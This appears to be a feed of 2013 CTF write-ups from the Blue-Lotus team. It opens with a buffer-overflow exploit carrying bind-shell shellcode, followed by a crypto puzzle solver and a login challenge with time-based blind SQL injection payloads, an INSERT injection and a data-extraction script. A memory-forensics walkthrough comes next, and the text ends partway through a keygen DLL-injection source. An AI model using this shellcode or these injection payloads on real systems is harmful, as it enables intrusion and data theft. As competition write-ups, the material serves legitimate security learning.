  <div class="code"><pre><span class="keyword">import</span> <span class="include">sys</span>, <span class="include">os</span>, <span class="include">time</span>, <span class="include">struct</span>, <span class="include">socket</span>

<span class="keyword">def</span> <span class="function">p32</span>(addr):
    <span class="keyword">return</span> struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;I</span><span class="delimiter">&quot;</span></span>, addr)

<span class="keyword">def</span> <span class="function">r</span>(s, t=<span class="float">0.1</span>):
    time.sleep(t)
    <span class="keyword">return</span> s.recv(<span class="integer">8192</span>)

<span class="keyword">def</span> <span class="function">se</span>(s, buf):
    s.send(buf)

HOST = <span class="string"><span class="delimiter">&quot;</span><span class="content">128.238.66.217</span><span class="delimiter">&quot;</span></span>
HOST = <span class="string"><span class="delimiter">&quot;</span><span class="content">192.168.1.180</span><span class="delimiter">&quot;</span></span>
PORT = <span class="integer">34266</span>

SHELLCODE = \
<span class="string"><span class="delimiter">&quot;</span><span class="char">\x31</span><span class="char">\xdb</span><span class="char">\xf7</span><span class="char">\xe3</span><span class="char">\x53</span><span class="char">\x43</span><span class="char">\x53</span><span class="char">\x6a</span><span class="char">\x02</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\xb0</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="delimiter">&quot;</span></span> +\
<span class="string"><span class="delimiter">&quot;</span><span class="char">\x5b</span><span class="char">\x5e</span><span class="char">\x52</span><span class="char">\x68</span><span class="char">\x02</span><span class="char">\x00</span><span class="char">\x11</span><span class="char">\x5c</span><span class="char">\x6a</span><span class="char">\x10</span><span class="char">\x51</span><span class="char">\x50</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\x6a</span><span class="delimiter">&quot;</span></span> +\
<span class="string"><span class="delimiter">&quot;</span><span class="char">\x66</span><span class="char">\x58</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x89</span><span class="char">\x41</span><span class="char">\x04</span><span class="char">\xb3</span><span class="char">\x04</span><span class="char">\xb0</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x43</span><span class="char">\xb0</span><span class="delimiter">&quot;</span></span> +\
<span class="string"><span class="delimiter">&quot;</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x93</span><span class="char">\x59</span><span class="char">\x6a</span><span class="char">\x3f</span><span class="char">\x58</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x49</span><span class="char">\x79</span><span class="char">\xf8</span><span class="char">\x68</span><span class="char">\x2f</span><span class="delimiter">&quot;</span></span> +\
<span class="string"><span class="delimiter">&quot;</span><span class="char">\x2f</span><span class="char">\x73</span><span class="char">\x68</span><span class="char">\x68</span><span class="char">\x2f</span><span class="char">\x62</span><span class="char">\x69</span><span class="char">\x6e</span><span class="char">\x89</span><span class="char">\xe3</span><span class="char">\x50</span><span class="char">\x53</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\xb0</span><span class="delimiter">&quot;</span></span> +\
<span class="string"><span class="delimiter">&quot;</span><span class="char">\x0b</span><span class="char">\xcd</span><span class="char">\x80</span><span class="delimiter">&quot;</span></span>

s = socket.socket()
s.connect((HOST, PORT))

<span class="keyword">print</span> r(s)
se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">csaw2013</span><span class="delimiter">&quot;</span></span>)
<span class="keyword">print</span> r(s)

se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">S1mplePWD</span><span class="delimiter">&quot;</span></span>)
<span class="keyword">print</span> r(s)
se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">65535</span><span class="delimiter">&quot;</span></span>)
read = p32(<span class="hex">0x80486e0</span>)
pop3ret = p32(<span class="hex">0x8049110</span>)
static = p32(<span class="hex">0x804b000</span>)
fd = p32(<span class="integer">4</span>)
jmpesp = <span class="string"><span class="delimiter">&quot;</span><span class="char">\xff</span><span class="char">\xe4</span><span class="delimiter">&quot;</span></span>
buf = <span class="string"><span class="delimiter">&quot;</span><span class="content">A</span><span class="delimiter">&quot;</span></span> * (<span class="integer">1056</span> + <span class="integer">0</span>)
buf = <span class="string"><span class="delimiter">&quot;</span><span class="content">A</span><span class="delimiter">&quot;</span></span> * <span class="hex">0x420</span>
buf += read + pop3ret + fd + static + p32(<span class="integer">2</span>) + static + <span class="string"><span class="delimiter">&quot;</span><span class="char">\x90</span><span class="delimiter">&quot;</span></span> * <span class="integer">100</span> + SHELLCODE
se(s, buf)
time.sleep(<span class="integer">5</span>)
se(s, jmpesp)
<span class="keyword">print</span> <span class="string"><span class="delimiter">'</span><span class="content">OK!!!</span><span class="delimiter">'</span></span>
</pre></div>
</div>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW CTF Quals 2013 crypto500 writeup]]></title>
    <link href="http://www.blue-lotus.net//csaw-ctf-quals-2013-crypto500-writeup/"/>
    <updated>2013-09-23T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//csaw-ctf-quals-2013-crypto500-writeup</id>
    <content type="html"><![CDATA[<h2 id="problem-description">Problem Description</h2>
<p>We’ve found the source to the Arstotzka spies rendevous server, we must find out their new vault key. Source code is <a href="http://shell-storm.org/repo/CTF/CSAW-2013/Crypto/slurp-500/slurp.py">here</a>.</p>

<p>So we have to crack sha512 puzzle and calc correct hash. At first i was trying to calculate sEphemeralPriv out, but it seems impossible. after some try, I realized that you can just use “n^m mod === something”.</p>

<h2 id="code">Code</h2>

<div><div class="CodeRay">
  <div class="code"><pre><span class="comment">#!/usr/bin/python</span>
<span class="keyword">import</span> <span class="include">os</span>
<span class="keyword">import</span> <span class="include">sys</span>
<span class="keyword">import</span> <span class="include">time</span>
<span class="keyword">import</span> <span class="include">struct</span>
<span class="keyword">import</span> <span class="include">socket</span>
<span class="keyword">import</span> <span class="include">telnetlib</span>
<span class="keyword">import</span> <span class="include">random</span>,<span class="include">hashlib</span>,<span class="include">base64</span>
<span class="keyword">from</span> <span class="include">hashlib</span> <span class="keyword">import</span> <span class="include">sha512</span>,<span class="include">sha1</span>

<span class="keyword">def</span> <span class="function">hashToInt</span>(*params):
    sha=sha512()
    <span class="keyword">for</span> el <span class="keyword">in</span> params:
        sha.update(<span class="string"><span class="delimiter">&quot;</span><span class="content">%r</span><span class="delimiter">&quot;</span></span>%el)
    <span class="keyword">return</span> <span class="predefined">int</span>(sha.hexdigest(), <span class="integer">16</span>)


<span class="keyword">def</span> <span class="function">gs</span>(num):
    <span class="keyword">return</span> hashlib.sha1(num).digest()

<span class="keyword">def</span> <span class="function">crack</span>(sha_p):
    <span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">crack:</span><span class="delimiter">&quot;</span></span>,sha_p
    ss=<span class="string"><span class="delimiter">&quot;</span><span class="delimiter">&quot;</span></span>
    ret=<span class="integer">0</span>
    <span class="keyword">for</span> keylen <span class="keyword">in</span> <span class="predefined">range</span>(<span class="integer">10</span>,<span class="integer">40</span>):
        <span class="keyword">for</span> add_1 <span class="keyword">in</span> <span class="predefined">range</span> (<span class="integer">0</span>,<span class="integer">140</span>):
            <span class="keyword">for</span> add_2 <span class="keyword">in</span> <span class="predefined">range</span> (<span class="integer">10</span>,<span class="integer">140</span>):
                <span class="keyword">for</span> add_3 <span class="keyword">in</span> <span class="predefined">range</span> (<span class="integer">0</span>,<span class="integer">155</span>):
                    <span class="keyword">for</span> add_4 <span class="keyword">in</span> <span class="predefined">range</span> (<span class="integer">0</span>,<span class="integer">155</span>):
                        <span class="keyword">for</span> add_5 <span class="keyword">in</span> <span class="predefined">range</span> (<span class="integer">0</span>,<span class="integer">155</span>):
                            new_msg=sha_p+<span class="predefined">chr</span>(add_1)+<span class="predefined">chr</span>(add_2)+<span class="predefined">chr</span>(add_3)+<span class="predefined">chr</span>(add_4)+<span class="predefined">chr</span>(add_5)
                        <span class="keyword">if</span> gs(new_msg)[-<span class="integer">3</span>:]==<span class="string"><span class="delimiter">&quot;</span><span class="char">\xff</span><span class="char">\xff</span><span class="char">\xff</span><span class="delimiter">&quot;</span></span>:
                            <span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">got one %s</span><span class="delimiter">&quot;</span></span>%<span class="predefined">len</span>(new_msg)
                            <span class="keyword">if</span> <span class="predefined">len</span>(new_msg)==<span class="integer">21</span>:
                                ss=new_msg
                                <span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">WE CRACK THE PUZZLE %d</span><span class="char">\n</span><span class="delimiter">&quot;</span></span>%<span class="predefined">len</span>(ss)
                                ret=<span class="integer">1</span>
                                <span class="keyword">return</span> (ret,ss)

<span class="keyword">return</span> (ret,ss)

<span class="comment">#s = socket.create_connection(('128.238.66.222',7788))</span>
s = socket.create_connection((<span class="string"><span class="delimiter">'</span><span class="content">127.0.0.1</span><span class="delimiter">'</span></span>,<span class="integer">7788</span>))
se=<span class="string"><span class="delimiter">&quot;</span><span class="delimiter">&quot;</span></span>
<span class="keyword">for</span> i <span class="keyword">in</span> <span class="predefined">range</span>(<span class="integer">1</span>,<span class="integer">100</span>):
    ss=s.recv(<span class="integer">1000</span>)
    <span class="keyword">print</span> ss
    sha_p=ss[<span class="predefined">len</span>(ss)-<span class="integer">16</span>:]
    new_msg=crack(sha_p[-<span class="integer">16</span>:])
    <span class="keyword">if</span> new_msg[<span class="integer">0</span>]:
        se=new_msg[<span class="integer">1</span>]
        <span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">send:</span><span class="delimiter">&quot;</span></span>,se,hashlib.sha1(se).digest()[-<span class="integer">3</span>:]
        <span class="keyword">break</span>


s.send(se)
<span class="comment">#raw_input()</span>
N = <span class="integer">59244860562241836037412967740090202129129493209028128777608075105340045576269119581606482976574497977007826166502644772626633024570441729436559376092540137133423133727302575949573761665758712151467911366235364142212961105408972344133228752133405884706571372774484384452551216417305613197930780130560424424943100169162129296770713102943256911159434397670875927197768487154862841806112741324720583453986631649607781487954360670817072076325212351448760497872482740542034951413536329940050886314722210271560696533722492893515961159297492975432439922689444585637489674895803176632819896331235057103813705143408943511591629</span>

index=<span class="integer">28483644508750028902258833085453121291738558908844640378204850915473006274236033891815596646870094954832384471913373171061099388958373536383247454431214837805096635029244738399662911119306089493137122381562794483801525427601711736403424013966624957471463169984161438593701202381673774894874606950326837142168801614196218030413825361835813060325642766963973454456577907567314093695138863251603368180581162185039224604662844750924047132242103613509637088222461132023037724162558095265336717907895786691004801515830247270579025866384571194244368350362690250445425121639616294300827554006418861422621428030154329451920623</span><span class="comment">#17095359415354811031956139176232822755293333580176796651092816713929142596363160518183074582333639666374490434453616522976528693318889544211598801485465809374370977363040240176466544504447562622451988654983833567639785357067606037932165650485806709538575591881306056180364137612491852807151445333929946180083335184143784040034635507293616742432550220001472750029503246943474764484598756871323795898352813684410952415776064654304191774216122857994311730048413954488815342894838841918071841785821830683677234982197021652871796420412165927837273704381564043458200253387672509280296033910910416083249362331740208987494679</span>

cEphemeral=<span class="integer">1</span>
send_num1=<span class="predefined">str</span>(<span class="predefined">hex</span>(index))[<span class="integer">2</span>:][:-<span class="integer">1</span>]
send_num2=<span class="predefined">str</span>(<span class="predefined">hex</span>(cEphemeral))[<span class="integer">2</span>:]

s.send(struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">H</span><span class="delimiter">&quot;</span></span>,<span class="predefined">len</span>(send_num1)))
s.send(send_num1)<span class="comment">#send numberc index--&gt;base number</span>

<span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">1:</span><span class="delimiter">&quot;</span></span>,s.recv(<span class="integer">72</span>)
<span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">2:</span><span class="delimiter">&quot;</span></span>,s.recv(<span class="integer">60</span>)

s.send(struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">H</span><span class="delimiter">&quot;</span></span>,<span class="predefined">len</span>(send_num2)))
s.send(send_num2)<span class="comment">#send number cEphemeral</span>

salt=<span class="predefined">int</span>(s.recv(<span class="integer">128</span>),<span class="integer">16</span>)
sEphemeral=<span class="predefined">long</span>(<span class="predefined">int</span>(s.recv(<span class="integer">514</span>),<span class="integer">16</span>))
                          
<span class="comment">#print &quot;3:salt:&quot;,salt</span>
<span class="comment">#print &quot;4:sEphemeral:&quot;,sEphemeral</span>
tmp=hashToInt(salt,<span class="string"><span class="delimiter">&quot;</span><span class="delimiter">&quot;</span></span>)
storedKey = <span class="predefined">pow</span>(index,tmp , N)
cq_sEphemeral=(<span class="integer">3</span> * storedKey) % N
tmp1=(sEphemeral-cq_sEphemeral)%N


<span class="comment">#agreedKey_withouthash = (cEphemeral * index^[sha512(salt, password) * slush])^sEphemeralPriv mod Nwhoami</span>
<span class="comment">#   cEphemeral=1  --&gt;</span>
<span class="comment">#agreedKey_withouthash = (index^[sha512(salt, password) * slush])^sEphemeralPriv mod N</span>
<span class="comment">#cause cEphemeral^^3 mod N =1</span>
<span class="comment">#so if sha512(salt, password) * slush * sEphemeralPriv mod 3 == 0</span>
<span class="comment">#agreedKey_withouthash = 1</span>
<span class="comment">#so we don't need to know sEphemeralPriv</span>

slush = hashToInt(cEphemeral, sEphemeral)
salt=hashToInt(index)
agreedKey=hashToInt(<span class="integer">1L</span>)
gennedKey=hashToInt(hashToInt(N) ^ hashToInt(index), hashToInt(index), salt,<span class="predefined">int</span>(cEphemeral), <span class="predefined">long</span>(sEphemeral), agreedKey)
send_num3=<span class="predefined">str</span>(<span class="predefined">hex</span>(gennedKey))[<span class="integer">2</span>:][:-<span class="integer">1</span>]
s.send(struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">H</span><span class="delimiter">&quot;</span></span>,<span class="predefined">len</span>(send_num3)))
s.send(send_num3)


<span class="keyword">print</span> s.recv(<span class="integer">1000</span>)
<span class="keyword">print</span> s.recv(<span class="integer">1000</span>)<span class="comment">#--&gt;flag recv</span>
<span class="keyword">print</span> s.recv(<span class="integer">1000</span>)
</pre></div>
</div>
</div>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ASIS CTF Finals 2013 Login]]></title>
    <link href="http://www.blue-lotus.net//asis-ctf-finals-2013-login/"/>
    <updated>2013-09-03T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//asis-ctf-finals-2013-login</id>
    <content type="html"><![CDATA[<p><a href="http://blog.deadcat.me/writeup/2013/09/01/asis-ctf-finals-2013-login/">http://blog.deadcat.me/writeup/2013/09/01/asis-ctf-finals-2013-login/</a></p>

<p>Description</p>

<pre><code>Login

Points  350     Level   1   Solves  5

Description
78.38.193.187

Hint:
$2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
</code></pre>

<p>All you can see is a login form, it always has some SQL injection problem.</p>

<p>After a lot of testing, finally we find a time-based blind injection in the username.</p>

<p>Using</p>

<pre><code>1' AND BENCHMARK(5000000,MD5(0x123)) AND ''='
</code></pre>

<p>then we start to using sqlmap to deal with it, but it is too slow and show some mistakes.</p>

<p>One of my friend write a python script to solve it, then we find some useful infomation. There are three database:</p>

<pre><code>information_schema
sqli_db
test
</code></pre>

<p>Obviously, sqli_db is suspicious, let’s see what it has.</p>

<pre><code>users
</code></pre>

<p>It only has a table named users.</p>

<pre><code>user_id
user_name
user_email
user_password_hash
</code></pre>

<p>At the beginning, we trying to fetch some data from it, but it is empty, some time later, we fetch a string from user_password_hash.</p>

<pre><code>$2y$10$gyI0vxnE3ZncmdLNGVmwTew/aPwBZPY4cEMCRENAjN4?0l8iu9O5R6iW
</code></pre>

<p>Just google “$2y$10″, we find it is the head of PHP blowfish hash, but it seems that there is no way to get the original value from it.</p>

<p>At that time, the admin give a hint on this problem:</p>

<pre><code>Hint:
$2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
</code></pre>

<p>At the same time, we find that the table users suddenly become empty. It inspire us to try INSERT.</p>

<pre><code>';insert into users values (333,'hqd','1','1@1.com');select '
</code></pre>

<p>And it works!</p>

<p>Then it is so easy, just INSERT the correct hash value of a password u know it before, there is a php script can to do this.</p>

<pre><code>';insert into users values (333,'hqd','$2y$10$YTNlM2RiNmFiODgzZGM2YuYqP7NHnuZ31TyucetPJkODqia/XH5KC','1@1.com');select '

#this is the blowfish hash value of 'admin'
</code></pre>

<p>Then just login use username:hqd and password:admin, then here is the flag.</p>

<pre><code>ASIS_9689926853009CAAD5BF824863077DC9
</code></pre>

<p>And taste the flavor of the first blood.</p>

<p>f.py</p>

<pre><code>from httplib import HTTPConnection

HTTPConnection._http_vsn_str = 'HTTP/1.0'

def post_payload( payload ):
    conn = HTTPConnection( '78.38.193.187' )
    conn.putrequest( 'POST', '/', skip_accept_encoding=True, skip_host=True )
    conn.putheader( 'Content-Type', 'application/x-www-form-urlencoded' )
    conn.putheader( 'Content-Length', str(len(payload)) )
    conn.endheaders( message_body=payload )
    resp = conn.getresponse()
    resp.read()

from urllib import urlencode
from time import time

def get_bool( expression ):
    start = time()
    post_payload( urlencode( dict(
        login = '',
        user_password = ' ',
        user_name = "'OR if(%s,benchmark(1500000,md5(0)),0) AND''='" % expression,
    ) ) )
    end = time()
    print 'Time:', end-start
    return end-start&amp;gt;0.95

def get_bit( expression ):
    return '1' if get_bool( expression ) else '0'

from itertools import count

def get_string( expression ):
    result = ''
    for i in count( start=1 ):
        char = ''
        for j in range(8)[::-1]:
            print 'Byte %d, Bit %d,' % (i,j),
            bit = get_bit( 'ascii(substr(%s,%d,1))&amp;gt;&amp;gt;%d&amp;amp;1' % ( expression, i, j ) )
            print bit
            char += bit
        char = int( char, 2 )
        if char == 0: break
        result += chr(char)
    return result

# def get_query( expression ):


# print get_string( 'database()' )
print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c695f6462 LIMIT 0,1)' )
# print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=\'information_shema\' LIMIT 0,1)' )
# print get_string( '(SELECT IFNULL(CAST(COLUMN_NAME AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=\'users\' LIMIT 5,1)' )
# print get_string( '(SELECT CAST(COUNT(*) AS CHAR) FROM users)' )
# print get_string( '@@datadir' )
# print get_string( 'user()' )
# print get_string( 'version()' )
</code></pre>

<p>a.php</p>

<p>Founded from <a href="http://pastebin.com/y9GKtx0b">pastebin</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ASIS CTF memdump writeup]]></title>
    <link href="http://www.blue-lotus.net//asis-ctf-memdump-writeup/"/>
    <updated>2013-09-01T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//asis-ctf-memdump-writeup</id>
    <content type="html"><![CDATA[<p>This is my first time to solve memory forensic challenge. I learn to use <a href="https://www.volatilesystems.com/default/volatility">volatility</a> from this <a href="http://blog.lse.epita.fr/articles/59-ebctf-2013-for100.html">post</a>.</p>

<p>Indicated from the memory dump strings, we know the system is <code>Ubuntu 12.04</code> with the kernel of <code>vmlinuz-3.5.0-23-generic</code>. After building a profile (the step by step procedure is <a href="http://code.google.com/p/volatility/wiki/LinuxMemoryForensics">here</a>), we can use the commands in volatility.</p>

<pre><code>$ vol.py --profile=LinuxUbuntu1204x64 -f mem.dump linux_pslist
...
0xffff88000acf4500 udevd        8112    0       0      0x000000000d06e000 2013-08-26 12:35:50 UTC+0000
0xffff88000d54ae00 asis-ctf     9425    1000    1000   0x000000000c8c9000 2013-08-26 12:48:54 UTC+0000
0xffff88000acf2e00 nano         15584   1000    1000   0x000000000d677000 2013-08-26 13:13:42 UTC+0000
...
</code></pre>

<p>We noticed that there is a process called <code>asis-ctf</code>, which seems to provide the flag. Then we dump the executable file from memory of the process.</p>

<pre><code>$ vol.py --profile=LinuxUbuntu1204x64 -f mem.dump linux_proc_maps -p 9425
Volatile Systems Volatility Framework 2.3_beta
Pid      Start              End            Flags               Pgoff Major  Minor  Inode      File Path                    
9425 0x0000000000400000 0x0000000000401000 r-x                   0x0    252      0     393333 /home/netadmin/asis-ctf      
9425 0x0000000000600000 0x0000000000601000 r--                   0x0    252      0     393333 /home/netadmin/asis-ctf      
9425 0x0000000000601000 0x0000000000602000 rw-                0x1000    252      0     393333 /home/netadmin/asis-ctf
...
$ vol.py --profile=LinuxUbuntu1204x64 -f mem.dump linux_dump_map -p 9425 -D output
$ hexdump -C -n 10 task.9425.0x600000.vma
00000000  7f 45 4c 46 02 01 01 00  00 00                    |.ELF......|
$ cat task.9425.0x600000.vma task.9425.0x601000.vma &gt; asis-ctf
$ file asis-ctf
asis-ctf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), stripped
</code></pre>

<p>Here we get the ELF file, after doing some RE, we got the flag by runing the script below:</p>

<pre><code>table_s = """42 49 55 52 4c 41 57 4e 64 5f 69 37 69 31 3e 63
6b 65 6c 33 3b 34 3d 65 3f 65 6f 63 47 31 75 36
72 66 42 62 4a 65 75 39 49 66 48 34 4d 32 4a 34
4e 37 4e 32 4d 35 55 65 50 37 82 32 84 61 52 35
83 39 85 61 53 34 89 39 8b 64 26"""
table = []
for c in table_s.replace("\n", " ").split(" "):
    n = int("0x" + c, 16)
    table.append(n)

flag = ""
for i in range(0x25):
    a = 2 * i
    c = table[a] - i - 1
    flag += chr(c)
print flag

$ python asis-ctf.py
ASIS_cb6bb012a8ea07a426254293de2bc0ef
</code></pre>

<p>The ELF file asis-ctf I got from the mem.dump is still not able to run, that’s why RE is still needed. Does anyone have an idea to extract an runnable asis-ctf from the memory? Please tell me;-)</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup]]></title>
    <link href="http://www.blue-lotus.net//ufo-ctf-2013-reverse-keygenme-writeup/"/>
    <updated>2013-08-08T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//ufo-ctf-2013-reverse-keygenme-writeup</id>
    <content type="html"><![CDATA[<p>I would come back with more details of this challenge.</p>

<p>Here is the approach that I used to generate a keygen: make a DLL and inject it into the target process. The source code of my library is as follows.</p>

<pre><code>#include "stdafx.h"
#include &lt;iostream&gt;

typedef unsigned char byte;

extern HMODULE m_hModule;
HANDLE m_hConsole;

#pragma pack(1)
struct CPU_
{
    byte al_;
    unsigned int k_init[4];
    unsigned int data[4];
    byte ip_;
    byte sp_;
    byte stack[8];
};
#pragma pack()

unsigned int step_func[256] = {0x4011D0, 
    0x401310, 
    0x401490, 
    0x401660, 
    0x4017F0, 
    0x401940, 
    0x401AC0, 
    0x401C90, 
    0x401DF0, 
    0x401FA0, 
    0x402130, 
    0x4022E0, 
    0x402460, 
    0x402660, 
    0x4027D0, 
    0x402960, 
    0x402B50, 
    0x402CB0, 
    0x402E40, 
    0x403010, 
    0x4031C0, 
    0x403330, 
    0x4034D0, 
    0x4036A0, 
    0x403840, 
    0x4039A0, 
    0x403B00, 
    0x403C50, 
    0x403DE0, 
    0x403F30, 
    0x4040A0, 
    0x404260, 
    0x404430, 
    0x4045F0, 
    0x404760, 
    0x404900, 
    0x404A70, 
    0x404C30, 
    0x404DA0, 
    0x404F40, 
    0x4050C0, 
    0x4051E0, 
    0x405380, 
    0x4054D0, 
    0x4056A0, 
    0x405850, 
    0x4059D0, 
    0x405B50, 
    0x405D10, 
    0x405E90, 
    0x406030, 
    0x406140, 
    0x4062D0, 
    0x4064A0, 
    0x406610, 
    0x4067A0, 
    0x406940, 
    0x406A80, 
    0x406C20, 
    0x406DF0, 
    0x406F90, 
    0x407110, 
    0x4072A0, 
    0x407420, 
    0x4075A0, 
    0x407740, 
    0x407880, 
    0x407A50, 
    0x407C00, 
    0x407DB0, 
    0x407F80, 
    0x408120, 
    0x408290, 
    0x408410, 
    0x408570, 
    0x4086D0, 
    0x408890, 
    0x4089D0, 
    0x408B70, 
    0x408D20, 
    0x408EA0, 
    0x408FE0, 
    0x409170, 
    0x4092B0, 
    0x409490, 
    0x409640, 
    0x4097D0, 
    0x4099A0, 
    0x409B70, 
    0x409CC0, 
    0x409E90, 
    0x409FE0, 
    0x40A150, 
    0x40A290, 
    0x40A410, 
    0x40A5D0, 
    0x40A770, 
    0x40A8D0, 
    0x40AA30, 
    0x40ABA0, 
    0x40AD20, 
    0x40AEB0, 
    0x40B050, 
    0x40B1B0, 
    0x40B3B0, 
    0x40B530, 
    0x40B6D0, 
    0x40B860, 
    0x40BA40, 
    0x40BBD0, 
    0x40BD50, 
    0x40BEB0, 
    0x40C060, 
    0x40C1A0, 
    0x40C370, 
    0x40C510, 
    0x40C670, 
    0x40C7F0, 
    0x40C990, 
    0x40CB00, 
    0x40CCC0, 
    0x40CE50, 
    0x40CFF0, 
    0x40D1C0, 
    0x40D300, 
    0x40D460, 
    0x40D5D0, 
    0x40D710, 
    0x40D870, 
    0x40DA00, 
    0x40DBD0, 
    0x40DD60, 
    0x40DEE0, 
    0x40E080, 
    0x40E230, 
    0x40E3C0, 
    0x40E550, 
    0x40E6F0, 
    0x40E890, 
    0x40EA10, 
    0x40EB50, 
    0x40ED50, 
    0x40EE60, 
    0x40EF80, 
    0x40F0F0, 
    0x40F2A0, 
    0x40F400, 
    0x40F560, 
    0x40F710, 
    0x40F890, 
    0x40FA30, 
    0x40FBC0, 
    0x40FD50, 
    0x40FE90, 
    0x410020, 
    0x410180, 
    0x410340, 
    0x4104B0, 
    0x410620, 
    0x410780, 
    0x410930, 
    0x410B20, 
    0x410CB0, 
    0x410E00, 
    0x410F50, 
    0x411130, 
    0x411310, 
    0x4114B0, 
    0x4115F0, 
    0x411730, 
    0x4118E0, 
    0x411A40, 
    0x411BF0, 
    0x411DA0, 
    0x411F30, 
    0x4120F0, 
    0x412250, 
    0x4123B0, 
    0x412560, 
    0x4126D0, 
    0x412860, 
    0x4129F0, 
    0x412B90, 
    0x412D30, 
    0x412F10, 
    0x413070, 
    0x413200, 
    0x4133A0, 
    0x413510, 
    0x413660, 
    0x4137A0, 
    0x4138D0, 
    0x413A50, 
    0x413BC0, 
    0x413D30, 
    0x413F00, 
    0x4140C0, 
    0x414220, 
    0x4143A0, 
    0x4144F0, 
    0x414630, 
    0x4147C0, 
    0x414930, 
    0x414AC0, 
    0x414C70, 
    0x414DD0, 
    0x414F80, 
    0x4150E0, 
    0x4152A0, 
    0x415430, 
    0x4155E0, 
    0x415750, 
    0x4158C0, 
    0x415A40, 
    0x415BD0, 
    0x415D30, 
    0x415ED0, 
    0x416060, 
    0x416210, 
    0x416360, 
    0x416520, 
    0x416690, 
    0x416850, 
    0x4169F0, 
    0x416B20, 
    0x416CE0, 
    0x416E90, 
    0x417010, 
    0x417170, 
    0x417300, 
    0x417490, 
    0x417690, 
    0x417860, 
    0x417A20, 
    0x417B70, 
    0x417D50, 
    0x417EC0, 
    0x417FD0, 
    0x418140, 
    0x418290, 
    0x418420, 
    0x418610, 
    0x4187C0, 
    0x418930, 
    0x418AD0, 
    0x418C50, 
    0x418E30, 
    0x418FD0, 
    0x419140, 
    0x419280, 
    0x419410, 
    0x4195B0, 
    0x419710, 
    0x4198B0, 
    0x419A00, 
    0x419B60};

typedef void (__thiscall *__prepare_teamname)(struct CPU_* pCpu, char* szTeamName);
typedef void (*__tean)(int uDecryptFlag, byte* pSrc, byte* pDst, unsigned int *k, unsigned int length);
typedef void (__thiscall *__step)(struct CPU_* pCpu, unsigned int operation);

__prepare_teamname prepare_teamname;
__tean tean;
__step step[256];

VOID Initialize()
{
    prepare_teamname = (__prepare_teamname)0x419d00;
    tean = (__tean)0x41ed50;

    for(int i = 0; i &lt;= 0xff; ++i)
    {
        step[i] = (__step)step_func[i];
    }
}

BOOL Search(byte* cmd, int ip, struct CPU_* cpu_, byte* dst_stack, byte* operation, int* final_ip, byte* init_stack)
{
    if(ip &gt;= 16)
    {
        // Reach the end!
        if(cpu_-&gt;ip_ &gt;= 32 &amp;&amp; cpu_-&gt;sp_ &gt;= 8)
        {
            *final_ip = cpu_-&gt;ip_;
            return TRUE;
        }
        return FALSE;
    }
    else if(ip &gt;= 7)
    {
        // Do not pop anything onto our stack!
        // We only try to manipulate the ip
        for(int i = 1; i &lt;= 0xff; ++i)
        {
            struct CPU_ new_cpu;
            memcpy(&amp;new_cpu, cpu_, sizeof(struct CPU_));

            int old_sp = new_cpu.sp_;
            // Step
            step[cmd[ip]](&amp;new_cpu, i);
            if(old_sp != new_cpu.sp_)
            {
                // A new value has been written on stack
                // return FALSE;
            }
            else
            {
                if(Search(cmd, ip + 1, &amp;new_cpu, dst_stack, operation, final_ip, init_stack))
                {
                    operation[ip] = i;
                    return TRUE;
                }
            }
        }
    }
    else /* if(ip &gt;= 0 &amp;&amp; ip &lt; 7) */
    {
        for(int init_stack_byte = 0; init_stack_byte &lt;= 0xff; ++init_stack_byte)
        {
            cpu_-&gt;stack[cpu_-&gt;sp_ - 1] = (byte)init_stack_byte;

            for(int i = 1; i &lt;= 0xff; ++i)
            {
                struct CPU_ new_cpu;
                memcpy(&amp;new_cpu, cpu_, sizeof(struct CPU_));

                int old_sp = new_cpu.sp_;
                // Step
                step[cmd[ip]](&amp;new_cpu, i);
                if(old_sp != new_cpu.sp_)
                {
                    // A new value has been written on stack
                    if(new_cpu.stack[new_cpu.sp_ - 2] == dst_stack[new_cpu.sp_ - 2])
                    {
                        // Search the next step
                        char buf[40];
                        sprintf_s(buf, "sp = %d, init_stack = %x\n", 
                            new_cpu.sp_ - 2,
                            init_stack_byte);
                        WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);
